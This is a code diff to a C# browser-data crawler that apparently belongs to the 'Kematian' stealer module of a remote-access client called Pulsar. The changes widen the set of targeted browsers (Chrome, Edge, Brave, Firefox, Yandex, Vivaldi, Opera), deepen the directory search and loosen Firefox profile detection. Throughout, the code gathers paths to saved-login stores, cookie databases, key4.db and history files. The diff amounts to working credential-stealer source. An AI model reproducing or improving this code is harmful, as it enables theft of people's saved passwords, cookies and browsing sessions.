@@ -11,85 +11,167 @@ namespace Pulsar.Client.Kematian.Browsers.Helpers
 {
     public class Crawler
     {
-        private const int MAX_DEPTH = 3;
+        private const int MAX_DEPTH = 4;
         private readonly string[] knownBrowserPaths = {
             @"Opera",
             @"Opera Software\Opera GX Stable",
+            @"Google\Chrome",
+            @"Google\Chrome SxS",
+            @"Microsoft\Edge",
+            @"BraveSoftware\Brave-Browser",
+            @"Mozilla\Firefox",
+            @"Yandex\YandexBrowser",
+            @"Vivaldi",
+            @"Chromium"
+        };
+
+        private readonly HashSet<string> skipDirectories = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
+        {
+            "temp", "cache", "logs", "thumbnails", "crash reports", "crashpad", 
+            "webcache", "snapshots", "code cache", "service worker", "blob_storage",
+            "system32", "windowsapps", "program files", "appdata", "$recycle.bin",
+            "windows", "system volume information", "microsoft", "programdata",
+            "nvidia", "amd", "intel", "drivers", "games", "updater", "installer"
+        };
+
+        private readonly string[] geckoProfFiles = {
+            "key4.db",
+            "logins.json",
+            "cookies.sqlite",
+            "places.sqlite",
+            "permissions.sqlite",
+            "prefs.js",
+            "favicons.sqlite"
         };
 
         private readonly string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
         private readonly string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+        
+        private static List<BrowserChromium> cachedChromiumBrowsers;
+        private static List<BrowserGecko> cachedGeckoBrowsers;
+        private static readonly object cacheLock = new object();
+        private static bool isCacheInitialized = false;
 
         public AllBrowsers FindAllBrowsers()
         {
-            var chromiumBrowsers = new ConcurrentBag<BrowserChromium>();
-            var geckoBrowsers = new ConcurrentBag<BrowserGecko>();
-            string[] rootDirs = { localAppData, appData };
-
-            Parallel.ForEach(rootDirs, rootDir =>
+            if (isCacheInitialized)
             {
-                if (Directory.Exists(rootDir))
+                return new AllBrowsers
                 {
-                    Debug.WriteLine($"[INFO] Starting deep search in: {rootDir}");
-                    if (rootDir == appData)
+                    Chromium = cachedChromiumBrowsers.ToArray(),
+                    Gecko = cachedGeckoBrowsers.ToArray()
+                };
+            }
+
+            lock (cacheLock)
+            {
+                if (isCacheInitialized)
+                {
+                    return new AllBrowsers
                     {
-                        SearchDirectory(rootDir, chromiumBrowsers, geckoBrowsers, true);
-                    }
-                    else
+                        Chromium = cachedChromiumBrowsers.ToArray(),
+                        Gecko = cachedGeckoBrowsers.ToArray()
+                    };
+                }
+
+                var chromiumBrowsers = new List<BrowserChromium>();
+                var geckoBrowsers = new List<BrowserGecko>();
+                
+                CheckKnownBrowserPaths(chromiumBrowsers, geckoBrowsers);
+
+                string[] rootDirs = { localAppData, appData };
+                
+                foreach (var rootDir in rootDirs)
+                {
+                    if (Directory.Exists(rootDir))
                     {
-                        SearchDirectory(rootDir, chromiumBrowsers, geckoBrowsers, false);
+                        Debug.WriteLine($"[INFO] Starting deep search in: {rootDir}");
+                        if (rootDir == appData)
+                        {
+                            SearchDirectory(rootDir, chromiumBrowsers, geckoBrowsers, true);
+                        }
+                        else
+                        {
+                            SearchDirectory(rootDir, chromiumBrowsers, geckoBrowsers, false);
+                        }
                     }
                 }
-            });
 
-            // Check known browser paths
-            foreach (var knownPath in knownBrowserPaths)
-            {
-                string fullPath = Path.Combine(appData, knownPath);
-                if (Directory.Exists(fullPath))
+                cachedChromiumBrowsers = chromiumBrowsers.OrderBy(b => b.Name).ToList();
+                cachedGeckoBrowsers = geckoBrowsers.OrderBy(b => b.Name).ToList();
+                isCacheInitialized = true;
+
+                LogFoundBrowsers(cachedChromiumBrowsers, cachedGeckoBrowsers);
+
+                return new AllBrowsers
                 {
-                    Debug.WriteLine($"[INFO] Checking known browser path: {fullPath}");
-                    if (knownPath.Contains("Opera"))
-                    {
-                        CheckForOperaBrowser(fullPath, chromiumBrowsers);
-                    }
-                    else
-                    {
-                        CheckForBrowser(fullPath, chromiumBrowsers, geckoBrowsers, true);
-                    }
+                    Chromium = cachedChromiumBrowsers.ToArray(),
+                    Gecko = cachedGeckoBrowsers.ToArray()
+                };
+            }
+        }
+
+        private void CheckKnownBrowserPaths(List<BrowserChromium> chromiumBrowsers, List<BrowserGecko> geckoBrowsers)
+        {
+            string[] basePaths = { localAppData, appData };
+            var allPaths = new List<string>();
+            
+            foreach (var basePath in basePaths)
+            {
+                foreach (var knownPath in knownBrowserPaths)
+                {
+                    allPaths.Add(Path.Combine(basePath, knownPath));
                 }
             }
 
-            // Log found browsers
-            LogFoundBrowsers(chromiumBrowsers, geckoBrowsers);
-
-            return new AllBrowsers
+            foreach (var fullPath in allPaths.OrderBy(p => p))
             {
-                Chromium = chromiumBrowsers.ToArray(),
-                Gecko = geckoBrowsers.ToArray()
-            };
+                if (Directory.Exists(fullPath))
+                {
+                    Debug.WriteLine($"[INFO] Checking known browser path: {fullPath}");
+                    
+                    bool isRoaming = fullPath.StartsWith(appData, StringComparison.OrdinalIgnoreCase);
+                    
+                    if (fullPath.Contains("Opera"))
+                    {
+                        CheckForOperaBrowser(fullPath, chromiumBrowsers);
+                    }
+                    else if (fullPath.Contains("Firefox"))
+                    {
+                        if (isRoaming)
+                        {
+                            CheckForGeckoBrowser(fullPath, geckoBrowsers);
+                        }
+                    }
+                    else
+                    {
+                        CheckForBrowser(fullPath, chromiumBrowsers, geckoBrowsers, isRoaming);
+                    }
+                }
+            }
         }
 
-        private void SearchDirectory(string directory, ConcurrentBag<BrowserChromium> chromiumBrowsers,
-                                          ConcurrentBag<BrowserGecko> geckoBrowsers, bool isRoaming, int depth = 0)
+        private void SearchDirectory(string directory, List<BrowserChromium> chromiumBrowsers,
+                                     List<BrowserGecko> geckoBrowsers, bool isRoaming, int depth = 0)
         {
             if (depth > MAX_DEPTH) return;
 
             try
             {
+                string dirName = Path.GetFileName(directory).ToLowerInvariant();
+                if (skipDirectories.Contains(dirName))
+                {
+                    return;
+                }
+
                 CheckForBrowser(directory, chromiumBrowsers, geckoBrowsers, isRoaming);
 
-                // Skip some common non-browser directories to improve performance
-                string dirName = Path.GetFileName(directory).ToLowerInvariant();
-                if (dirName == "temp" || dirName == "cache" || dirName == "logs" ||
-                    dirName == "thumbnails" || dirName == "crash reports")
-                    return;
-
-                var subDirs = Directory.GetDirectories(directory);
-                Parallel.ForEach(subDirs, dir =>
+                var subDirs = Directory.GetDirectories(directory).OrderBy(d => d).ToList();
+                
+                foreach (var dir in subDirs)
                 {
                     SearchDirectory(dir, chromiumBrowsers, geckoBrowsers, isRoaming, depth + 1);
-                });
+                }
             }
             catch (UnauthorizedAccessException)
             {
@@ -105,8 +187,8 @@ namespace Pulsar.Client.Kematian.Browsers.Helpers
             }
         }
 
-        private void CheckForBrowser(string path, ConcurrentBag<BrowserChromium> chromiumBrowsers,
-                                          ConcurrentBag<BrowserGecko> geckoBrowsers, bool isRoaming)
+        private void CheckForBrowser(string path, List<BrowserChromium> chromiumBrowsers,
+                                          List<BrowserGecko> geckoBrowsers, bool isRoaming)
         {
             try
             {
@@ -122,23 +204,22 @@ namespace Pulsar.Client.Kematian.Browsers.Helpers
 
                         if (profiles.Count > 0)
                         {
-                            chromiumBrowsers.Add(new BrowserChromium
+                            lock (chromiumBrowsers)
                             {
-                                Name = Path.GetFileName(path),
-                                LocalState = localStatePath,
-                                Path = path,
-                                Profiles = profiles.ToArray()
-                            });
+                                chromiumBrowsers.Add(new BrowserChromium
+                                {
+                                    Name = Path.GetFileName(path),
+                                    LocalState = localStatePath,
+                                    Path = path,
+                                    Profiles = profiles.ToArray()
+                                });
+                            }
                             Debug.WriteLine($"[SUCCESS] Added Chromium browser with {profiles.Count} profiles");
                         }
                     }
                 }
 
-                // Check for Firefox/Gecko browsers
-                if (isRoaming)
-                {
-                    CheckForGeckoBrowser(path, geckoBrowsers);
-                }
+                CheckForGeckoBrowser(path, geckoBrowsers);
             }
             catch (Exception ex)
             {
@@ -162,24 +243,21 @@ namespace Pulsar.Client.Kematian.Browsers.Helpers
                     TryAddChromiumProfile(profiles, defaultProfile, "Default");
                 }
 
-                // Check Profile X directories
                 var profileDirs = Directory.GetDirectories(userDataPath)
                     .Where(dir => Path.GetFileName(dir).StartsWith("Profile ", StringComparison.OrdinalIgnoreCase))
+                    .OrderBy(dir => {
+                        string name = Path.GetFileName(dir);
+                        if (name.StartsWith("Profile ", StringComparison.OrdinalIgnoreCase) && 
+                            name.Length > 8 && 
+                            int.TryParse(name.Substring(8), out int profileNumber))
+                        {
+                            return profileNumber;
+                        }
+                        return 9999;
+                    })
                     .ToList();
 
                 foreach (var profileDir in profileDirs)
-                {
-                    TryAddChromiumProfile(profiles, profileDir, Path.GetFileName(profileDir));
-                }
-
-                // Check for other non-standard profile directories
-                var otherProfiles = Directory.GetDirectories(userDataPath)
-                    .Where(dir => !Path.GetFileName(dir).StartsWith("Profile ", StringComparison.OrdinalIgnoreCase) &&
-                                 Path.GetFileName(dir) != "Default" &&
-                                 !IsSystemDirectory(Path.GetFileName(dir)))
-                    .ToList();
-
-                foreach (var profileDir in otherProfiles)
                 {
                     TryAddChromiumProfile(profiles, profileDir, Path.GetFileName(profileDir));
                 }
@@ -189,7 +267,7 @@ namespace Pulsar.Client.Kematian.Browsers.Helpers
                 Debug.WriteLine($"[ERROR] Finding Chromium profiles: {ex.Message}");
             }
 
-            return profiles;
+            return profiles.OrderBy(p => p.Name).ToList();
         }
 
         private void TryAddChromiumProfile(List<ProfileChromium> profiles, string profileDir, string profileName)
@@ -241,24 +319,25 @@ namespace Pulsar.Client.Kematian.Browsers.Helpers
             }
         }
 
-        private void CheckForGeckoBrowser(string path, ConcurrentBag<BrowserGecko> geckoBrowsers)
+        private void CheckForGeckoBrowser(string path, List<BrowserGecko> geckoBrowsers)
         {
             try
             {
-                // First check direct path for Firefox profile
+                // First check direct path for Gecko profile
                 string dirName = Path.GetFileName(path);
-                if (dirName.Contains(".default-") || dirName.EndsWith(".default"))
+                if (dirName.Contains(".default-") || dirName.EndsWith(".default") || 
+                    ContainsGeckoProfileFiles(path))
                 {
                     TryAddGeckoProfile(path, geckoBrowsers);
                 }
 
-                // Check for Firefox "Profiles" directory structure
                 string profilesPath = Path.Combine(path, "Profiles");
                 if (Directory.Exists(profilesPath))
                 {
                     var defaultProfiles = Directory.GetDirectories(profilesPath)
                         .Where(dir => Path.GetFileName(dir).Contains(".default-") ||
-                                      Path.GetFileName(dir).EndsWith(".default"))
+                                      Path.GetFileName(dir).EndsWith(".default") ||
+                                      ContainsGeckoProfileFiles(dir))
                         .ToList();
 
                     if (defaultProfiles.Count > 0)
@@ -269,14 +348,62 @@ namespace Pulsar.Client.Kematian.Browsers.Helpers
                         }
                     }
                 }
+
+                string[] potentialProfileFolders = { "Browser", "browser", "profile", "Profiles", "Data" };
+                foreach(var folder in potentialProfileFolders)
+                {
+                    string potentialDir = Path.Combine(path, folder);
+                    if (Directory.Exists(potentialDir) && !potentialDir.Equals(profilesPath, StringComparison.OrdinalIgnoreCase))
+                    {
+                        if (ContainsGeckoProfileFiles(potentialDir))
+                        {
+                            TryAddGeckoProfile(potentialDir, geckoBrowsers);
+                        }
+
+                        try
+                        {
+                            var subDirs = Directory.GetDirectories(potentialDir);
+                            foreach (var subDir in subDirs)
+                            {
+                                if (ContainsGeckoProfileFiles(subDir))
+                                {
+                                    TryAddGeckoProfile(subDir, geckoBrowsers);
+                                }
+                            }
+                        }
+                        catch (Exception ex)
+                        {
+                            Debug.WriteLine($"[ERROR] Checking subdirectories in {potentialDir}: {ex.Message}");
+                        }
+                    }
+                }
             }
             catch (Exception ex)
             {
-                Debug.WriteLine($"[ERROR] Checking Firefox browser in {path}: {ex.Message}");
+                Debug.WriteLine($"[ERROR] Checking Gecko browser in {path}: {ex.Message}");
             }
         }
 
-        private void TryAddGeckoProfile(string profileDir, ConcurrentBag<BrowserGecko> geckoBrowsers)
+        private bool ContainsGeckoProfileFiles(string directory)
+        {
+            if (!Directory.Exists(directory)) return false;
+
+            int foundIndicators = 0;
+            foreach (var indicator in geckoProfFiles)
+            {
+                if (File.Exists(Path.Combine(directory, indicator)))
+                {
+                    foundIndicators++;
+                    if (foundIndicators >= 2)
+                    {
+                        return true;
+                    }
+                }
+            }
+            return false;
+        }
+
+        private void TryAddGeckoProfile(string profileDir, List<BrowserGecko> geckoBrowsers)
         {
             try
             {
@@ -292,32 +419,59 @@ namespace Pulsar.Client.Kematian.Browsers.Helpers
                 if (File.Exists(cookiesPath)) validFiles++;
                 if (File.Exists(historyPath)) validFiles++;
 
-                if (validFiles >= 2)
+                if (validFiles >= 1)
                 {
-                    string browserName = Directory.GetParent(Directory.GetParent(profileDir).FullName)?.Name + "\\" +
-                                         Path.GetFileName(Directory.GetParent(profileDir).FullName);
-
-                    geckoBrowsers.Add(new BrowserGecko
+                    string browserName = "Unknown Gecko";
+                    
+                    try
                     {
-                        Name = browserName,
-                        Path = profileDir,
-                        Key4 = key4Path,
-                        Logins = loginsPath,
-                        Cookies = cookiesPath,
-                        History = historyPath,
-                        ProfilesDir = Directory.GetParent(profileDir).FullName
-                    });
+                        var parent = Directory.GetParent(profileDir);
+                        if (parent != null)
+                        {
+                            if (parent.Name.Equals("Profiles", StringComparison.OrdinalIgnoreCase))
+                            {
+                                var grandParent = parent.Parent;
+                                if (grandParent != null)
+                                {
+                                    browserName = grandParent.Name;
+                                }
+                            }
+                            else
+                            {
+                                browserName = parent.Name;
+                            }
+                        }
+                    }
+                    catch
+                    {
+                        browserName = Path.GetFileName(profileDir);
+                    }
 
-                    Debug.WriteLine($"[SUCCESS] Added Firefox profile with {validFiles}/4 data files");
+                    // When adding browsers, use a lock to ensure thread safety
+                    lock (geckoBrowsers)
+                    {
+                        geckoBrowsers.Add(new BrowserGecko
+                        {
+                            Name = browserName,
+                            Path = profileDir,
+                            Key4 = key4Path,
+                            Logins = loginsPath,
+                            Cookies = cookiesPath,
+                            History = historyPath,
+                            ProfilesDir = Directory.GetParent(profileDir)?.FullName ?? profileDir
+                        });
+                    }
+
+                    Debug.WriteLine($"[SUCCESS] Added Gecko profile '{browserName}' with {validFiles}/4 data files");
                 }
             }
             catch (Exception ex)
             {
-                Debug.WriteLine($"[ERROR] Adding Firefox profile: {ex.Message}");
+                Debug.WriteLine($"[ERROR] Adding Gecko profile: {ex.Message}");
             }
         }
 
-        private void CheckForOperaBrowser(string path, ConcurrentBag<BrowserChromium> chromiumBrowsers)
+        private void CheckForOperaBrowser(string path, List<BrowserChromium> chromiumBrowsers)
         {
             try
             {
@@ -326,13 +480,16 @@ namespace Pulsar.Client.Kematian.Browsers.Helpers
 
                 if (profiles.Count > 0)
                 {
-                    chromiumBrowsers.Add(new BrowserChromium
+                    lock (chromiumBrowsers)
                     {
-                        Name = "Opera",
-                        LocalState = Path.Combine(path, "Local State"),
-                        Path = path,
-                        Profiles = profiles.ToArray()
-                    });
+                        chromiumBrowsers.Add(new BrowserChromium
+                        {
+                            Name = "Opera",
+                            LocalState = Path.Combine(path, "Local State"),
+                            Path = path,
+                            Profiles = profiles.ToArray()
+                        });
+                    }
                     Debug.WriteLine($"[SUCCESS] Added Opera browser with {profiles.Count} profiles");
                 }
             }
@@ -350,8 +507,8 @@ namespace Pulsar.Client.Kematian.Browsers.Helpers
                    lower == "jumplisticons" || lower.StartsWith(".");
         }
 
-        private void LogFoundBrowsers(ConcurrentBag<BrowserChromium> chromiumBrowsers,
-                                           ConcurrentBag<BrowserGecko> geckoBrowsers)
+        private void LogFoundBrowsers(List<BrowserChromium> chromiumBrowsers,
+                                           List<BrowserGecko> geckoBrowsers)
         {
             Debug.WriteLine("========== FOUND CHROMIUM BROWSERS ==========");
             foreach (var browser in chromiumBrowsers)
